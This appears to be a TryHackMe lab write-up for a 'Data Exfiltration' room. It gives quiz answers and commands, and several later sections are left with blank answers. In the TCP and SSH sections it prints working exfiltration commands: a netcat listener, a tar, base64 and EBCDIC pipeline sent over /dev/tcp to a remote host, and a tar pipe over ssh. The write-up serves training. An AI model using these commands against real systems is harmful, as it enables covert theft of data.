![Data Exfiltration Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_Banner.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_Cover.png" alt="Data Exfiltration Logo">
</p>

# Data Exfiltration

This guide contains the answer and steps necessary to get to them for the [Data Exfiltration](https://tryhackme.com/r/room/dataxexfilt) room.

## Table of contents

- [Data Exfiltration](#data-exfiltration)
- [Exfiltration using TCP socket](#exfiltration-using-tcp-socket)
- [Exfiltration using SSH](#exfiltration-using-ssh)
- [Exfiltrate using HTTP(S)](#exfiltrate-using-http(s))
- [Exfiltration using ICMP](#exfiltration-using-icmp)
- [DNS Configurations](#dns-configurations)
- [Exfiltration over DNS](#exfiltration-over-dns)
- [DNS Tunneling](#dns-tunneling)

### Data Exfiltration

1. In which case scenario will sending and receiving traffic continue during the connection?

   This answer can be found in the text.

   ><details><summary>Click for answer</summary>Tunneling</details>

2. In which case scenario will sending and receiving traffic be in one direction?

   This answer can be found in the text.

   ><details><summary>Click for answer</summary>Traditional data exfiltration</details>

3. In the next task, we will be discussing how data exfiltration over the TCP socket works!

### Exfiltration using TCP socket

1. Exfiltration using TCP sockets relies on ____________ protocols!

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Non-standard</details>

2. Now apply what we discussed to exfiltrate data over the TCP socket! Once you exfiltrate data successfully, hitCompletedto move on to the next task!

   We need to ssh into the jump server and setup a listener that outputs the result to a file.

   ```console
   ssh thm@10.10.66.20
   nc -nlvp 1337 > /tmp/task4-creds.data
   ```

   Next we ssh into the victim1 machine through the jumpserver.

   ```console
   ssh thm@10.10.66.20
   ssh thm@victim1.thm.com
   ```

   TCP LISTENER

   Next we compress and encode the data we want to exfiltrate in the 'task4' folder.

   ```console
   tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/1337
   ```

   This command will also send the data over the TCP socket.

   TCP EXFILTRATE

   Now that the files have been transfered to the jump server, we can decode en decompress the archive to get to the files.

   ```console
   dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar
   tar xvf task4-creds.tar
   ```

   TCP FILES

### Exfiltration using SSH

1. All packets sent using the Data Exfiltration technique over SSH are encrypted! (T=True/F=False)

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>T</details>

2. Replicate the steps to transfer data over the SSH client. Once you transfer the file successfully, hitCompletedand move on to the next task!

   On victim 1 we can archive the folder and send it directly through the SSH client.

   ```console
   tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
   ```

   SSH EXFILTRATE

   SSH FILES

### Exfiltrate using HTTP(S)

1. Check the Apache log file onweb.thm.comand get the flag!



   ><details><summary>Click for answer</summary></details>

2. When you visit thehttp://flag.thm.com/flagwebsite through the uploader machine via the HTTP tunneling technique, what is the flag?



   ><details><summary>Click for answer</summary></details>

### Exfiltration using ICMP

1. In which ICMP packet section can we include our data?



   ><details><summary>Click for answer</summary></details>

2. Follow the technique discussed in this task to establish a C2 ICMP connection between JumpBox and ICMP-Host. Then execute the "getFlag" command. What is the flag?



   ><details><summary>Click for answer</summary></details>

### DNS Configurations

1. Once the DNS configuration works fine, resolve theflag.thm.comdomain name. What is the IP address?



   ><details><summary>Click for answer</summary></details>

### Exfiltration over DNS

1. What is the maximum length for the subdomain name (label)?



   ><details><summary>Click for answer</summary></details>

2. The Fully Qualified FQDN domain name must not exceed ______characters.



   ><details><summary>Click for answer</summary></details>

3. Execute the C2 communication over the DNS protocol of theflag.tunnel.com. What is the flag?



   ><details><summary>Click for answer</summary></details>

### DNS Tunneling

1. When the iodine connection establishes to Attacker, run theifconfigcommand. How many interfaces are? (including the loopback interface)



   ><details><summary>Click for answer</summary></details>

2. What is the network interface name created by iodined?



   ><details><summary>Click for answer</summary></details>

3. Use the DNS tunneling to prove your access to the webserver,http://192.168.0.100/test.php. What is the flag?



   ><details><summary>Click for answer</summary></details>

